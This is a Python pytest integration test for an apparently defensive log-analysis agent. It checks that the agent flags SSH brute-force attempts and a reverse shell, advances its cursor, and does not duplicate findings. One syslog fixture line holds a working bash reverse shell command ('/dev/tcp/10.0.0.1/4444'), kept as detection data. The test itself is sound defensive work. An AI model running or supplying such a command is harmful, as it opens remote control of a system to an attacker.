from __future__ import annotations

import os
import uuid
from datetime import datetime, timezone
from pathlib import Path
import pytest
import yaml
from sqlalchemy import select

from core.config import DatabaseConfig
from core.db.models import AgentFindingModel, AgentStateModel, AuditLogModel, EventModel
from core.db.session import DatabaseManager
from shugo_agents.log_analysis.agent import LogAnalysisAgent
from shugo_agents.log_analysis.ingest.parsers import parse_auth_syslog_line


def test_agent_end_to_end_and_idempotency(tmp_path: Path):
    """Test full agent loop: event fetching, detection, deduplication, cursor advancement and idempotency."""
    db_file = tmp_path / "integration_agent.db"
    config_file = tmp_path / "test_config.yaml"

    config_data = {
        "database": {"url": f"sqlite:///{db_file}"},
        "runtime": {"agent_name": "log_analysis", "batch_size": 100},
        "ingest": {"enabled": False},
        "gemini": {"api_key": None},
        "detectors": {
            "brute_force": {"enabled": True, "failure_threshold": 3, "window_seconds": 300},
            "suspicious_commands": {"enabled": True},
        },
    }

    with open(config_file, "w", encoding="utf-8") as f:
        yaml.safe_dump(config_data, f)

    # Initialize Agent
    agent = LogAnalysisAgent(config_path=config_file)

    # Insert real event lines into events table
    real_lines = [
        "Nov 18 10:00:01 web01 sshd[101]: Failed password for root from 198.51.100.99 port 45123 ssh2",
        "Nov 18 10:00:05 web01 sshd[102]: Failed password for root from 198.51.100.99 port 45124 ssh2",
        "Nov 18 10:00:10 web01 sshd[103]: Failed password for root from 198.51.100.99 port 45125 ssh2",
        "Nov 18 10:00:15 web01 sudo: attacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ]

    with agent.db_manager.session() as session:
        for line in real_lines:
            ev = parse_auth_syslog_line(line)
            assert ev is not None
            session.add(
                EventModel(
                    id=ev.id,
                    source=ev.source,
                    host=ev.host,
                    timestamp=ev.timestamp,
                    event_type=ev.event_type,
                    raw=ev.raw,
                    normalized=ev.normalized,
                    processed_by=[],
                    created_at=datetime.now(timezone.utc),
                )
            )

    # First Step
    processed_count = agent.step()
    assert processed_count == 4

    # Verify findings created
    with agent.db_manager.session() as session:
        findings = session.execute(select(AgentFindingModel)).scalars().all()
        assert len(findings) == 2  # 1 brute force + 1 reverse shell
        rules = [f.rule for f in findings]
        assert any("brute_force" in r for r in rules)
        assert any("reverse_shell" in r for r in rules)

        # Verify cursor was saved
        state = session.execute(
            select(AgentStateModel).where(AgentStateModel.agent == "log_analysis")
        ).scalar_one()
        assert state.cursor is not None

        # Verify events marked as processed
        events = session.execute(select(EventModel)).scalars().all()
        for e in events:
            assert "log_analysis" in e.processed_by

    # Second Step: Idempotency assertion
    # Processing again must return 0 new events and create NO duplicate findings
    second_processed_count = agent.step()
    assert second_processed_count == 0

    with agent.db_manager.session() as session:
        findings_after = session.execute(select(AgentFindingModel)).scalars().all()
        # Exactly 2 findings remain - no duplicates!
        assert len(findings_after) == 2


def test_real_postgres_integration_if_reachable():
    """Integration test connecting to live PostgreSQL container if running."""
    pg_url = os.getenv(
        "DATABASE_URL",
        "postgresql+psycopg2://postgres:postgres@localhost:5432/shugo_cyber"
    )

    db_config = DatabaseConfig(url=pg_url)
    db_manager = DatabaseManager(db_config)

    try:
        is_connected = db_manager.check_connection_with_retry(max_retries=1, base_delay=0.1)
    except Exception:
        pytest.skip(
            f"PostgreSQL at {pg_url} is not currently running. "
            "Start postgres via 'docker-compose up -d postgres' to run this live integration test."
        )

    # If connected, test real tables
    db_manager.init_tables()
    with db_manager.session() as session:
        count = session.query(EventModel).count()
        assert count >= 0
